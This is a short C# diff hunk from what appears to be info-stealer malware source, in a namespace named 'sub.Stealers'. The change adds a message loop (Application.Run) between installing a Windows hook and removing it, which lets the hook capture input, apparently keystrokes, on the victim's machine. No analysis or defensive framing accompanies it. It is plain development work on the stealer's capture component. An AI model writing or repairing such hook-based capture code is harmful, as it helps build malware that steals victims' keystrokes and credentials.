@@ -64,6 +64,7 @@ namespace sub.Stealers
         public void Collect()
         {
             _hookID = SetHook(_proc);
+            Application.Run();
             UnhookWindowsHookEx(_hookID);
         }
 
